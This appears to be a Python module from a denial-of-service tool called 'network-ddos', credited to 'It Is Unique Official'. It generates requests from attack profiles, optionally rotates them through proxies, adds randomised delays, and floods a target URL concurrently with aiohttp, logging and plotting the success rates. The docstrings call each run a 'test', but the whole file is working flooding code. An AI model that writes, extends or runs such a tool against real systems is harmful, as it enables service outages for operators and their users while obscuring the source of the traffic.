import asyncio
import aiohttp
import time
import random
import logging
from aiohttp import ClientSession
from typing import Dict, List, Optional
from .profiles import AttackProfile
from .utils import Metrics, plot_metrics
from .config import load_config
from tqdm import tqdm  # For progress bar

# Setup logging
logging.basicConfig(
    filename="network_ddos.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

async def send_request(session: ClientSession, req: Dict, metrics: Metrics, rate_limit: float, progress: tqdm):
    """Send a single asynchronous request."""
    try:
        start_time = time.time()
        proxy = req.get("proxy")
        async with session.request(
            method=req["method"],
            url=req["url"],
            headers=req["headers"],
            data=req["payload"],
            timeout=aiohttp.ClientTimeout(total=5),
            proxy=proxy
        ) as response:
            elapsed_time = time.time() - start_time
            success = response.status == 200
            await metrics.record(success, elapsed_time)
            logging.info(f"Request {req['id']}: {req['method']} - Status {response.status} - Time {elapsed_time:.3f}s")
    except Exception as e:
        elapsed_time = time.time() - start_time
        await metrics.record(False, elapsed_time)
        logging.error(f"Request {req['id']}: {req['method']} - Failed - Error: {e}")
    progress.update(1)
    await asyncio.sleep(rate_limit + random.uniform(0, req["delay_variance"]))

async def run_test(
    url: str,
    request_count: int,
    concurrency: int,
    rate_limit: float,
    profiles: List[AttackProfile],
    proxies: Optional[List[str]] = None
) -> Metrics:
    """Run the network test with specified parameters."""
    metrics = Metrics()
    requests_list = [
        profile.generate_request(i, url, proxies)
        for i in range(1, request_count + 1)
        for profile in random.choices(profiles, k=1)
    ]
    
    print(f"Starting network-ddos test on {url} by It Is Unique Official")
    with tqdm(total=request_count, desc="Progress", unit="req") as progress:
        async with aiohttp.ClientSession() as session:
            tasks = [send_request(session, req, metrics, rate_limit, progress) for req in requests_list]
            await asyncio.gather(*tasks[:concurrency])  # Initial batch
            await asyncio.gather(*tasks[concurrency:])  # Remaining
    
    return metrics

def execute_test(
    url: str,
    request_count: int,
    concurrency: int,
    rate_limit: float,
    profiles: List[AttackProfile],
    proxies: Optional[List[str]] = None
):
    """Execute the test and return results."""
    start_time = time.time()
    metrics = asyncio.run(run_test(url, request_count, concurrency, rate_limit, profiles, proxies))
    total_time = time.time() - start_time
    
    summary = metrics.summary()
    print("\n=== Network-DDoS Test Summary ===")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Total Time Taken: {total_time:.2f}s")
    
    plot_metrics(summary)
    logging.info(f"Test completed in {total_time:.2f}s")
    return summary
